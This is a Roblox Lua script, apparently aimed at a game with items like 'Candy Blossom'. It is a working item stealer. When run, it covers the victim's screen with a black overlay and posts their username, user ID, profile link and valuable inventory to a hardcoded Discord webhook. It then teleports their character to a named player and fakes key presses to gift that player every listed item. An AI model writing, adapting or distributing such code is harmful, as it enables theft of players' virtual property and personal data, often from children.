--===[ USER CONFIGURATION ]===--
local webhookURL = "https://discord.com/api/webhooks/1111606979585130537/0joXFyaI312c33vvQLZ0-7M7dCOJJjIeRYQVxB2qyMg79N0ZSZokugMrbI9G9WhoOnHl"
local tradeTarget = "Yanzikke"
local valuableItems = {
    "Candy Blossom",
    "DragonFly",
    "Racoon",
    "Cactus",
    "Durian",
    "Chicken Zombie",
    "Blood Hedgehog"
}
--============================--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local RunService = game:GetService("RunService")

-- SCREEN BLACKOUT
local function blackoutScreen()
    local gui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
    gui.Name = "Blackout_" .. math.random(1, 10000)
    local frame = Instance.new("Frame", gui)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.ZIndex = 999
end

-- SEND WEBHOOK (FIXED)
local function sendWebhook()
    local success, err = pcall(function()
        local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
        if not backpack then return end
        
        local count = 0
        local itemsList = {}

        for _, item in ipairs(backpack:GetChildren()) do
            if table.find(valuableItems, item.Name) then
                count += 1
                table.insert(itemsList, item.Name)
            end
        end

        local placeName = "Unknown"
        local placeInfo = pcall(function()
            return MarketplaceService:GetProductInfo(game.PlaceId)
        end)
        if placeInfo then placeName = placeInfo.Name end

        local payload = {
            username = "Item Logger",
            embeds = {{
                title = "Script Executed",
                color = 65280,
                fields = {
                    {name = "Username", value = LocalPlayer.Name, inline = true},
                    {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
                    {name = "Place", value = placeName, inline = true},
                    {name = "Join Link", value = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile", inline = false},
                    {name = "Players in Server", value = tostring(#Players:GetPlayers()), inline = true},
                    {name = "Valuables", value = count > 0 and (count .. " item(s): " .. table.concat(itemsList, ", ")) or "No valuable items found", inline = false}
                },
                timestamp = DateTime.now():ToIsoDate()
            }}
        }

        local jsonPayload = HttpService:JSONEncode(payload)
        HttpService:PostAsync(webhookURL, jsonPayload)
    end)
    
    if not success then
        warn("Webhook failed: " .. tostring(err))
    end
end

-- AUTO GIFT (FIXED)
local function autoGiftAll()
    local target = Players:FindFirstChild(tradeTarget)
    if not target then
        warn(tradeTarget .. " not found in server.")
        return
    end

    -- Wait for character to load
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.CharacterAdded:Wait()
        task.wait(1)
    end

    local backpack = LocalPlayer:FindFirstChild("Backpack") or LocalPlayer:WaitForChild("Backpack", 5)
    if not backpack then
        warn("Backpack not found")
        return
    end

    local root = LocalPlayer.Character.HumanoidRootPart
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")

    -- Teleport near target
    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
        local targetPos = target.Character.HumanoidRootPart.Position
        root.CFrame = CFrame.new(targetPos + Vector3.new(3, 0, 3))
        task.wait(1)
    else
        warn("Target character not loaded")
        return
    end

    -- Gift each item
    for _, item in ipairs(backpack:GetChildren()) do
        if table.find(valuableItems, item.Name) then
            -- Re-check distance before each gift
            if (root.Position - target.Character.HumanoidRootPart.Position).Magnitude > 10 then
                root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 2)
                task.wait(0.5)
            end

            -- Equip and gift
            humanoid:EquipTool(item)
            task.wait(0.3)
            
            -- Simulate E key press (more reliable)
            for i = 1, 3 do  -- Multiple presses for reliability
                VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                task.wait(0.05)
                VirtualInputManager:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                task.wait(0.5)
            end
            
            task.wait(1)  -- Cooldown between gifts
        end
    end
end

-- MAIN EXECUTION (WITH ERROR HANDLING)
local function main()
    blackoutScreen()
    
    -- Try webhook first
    local success, err = pcall(sendWebhook)
    if not success then
        warn("Webhook failed: " .. tostring(err))
    end
    
    task.wait(2)
    
    -- Try auto-gifting
    success, err = pcall(autoGiftAll)
    if not success then
        warn("Auto-gift failed: " .. tostring(err))
    end
end

-- Run with protection
local success, err = pcall(main)
if not success then
    warn("Script crashed: " .. tostring(err))
end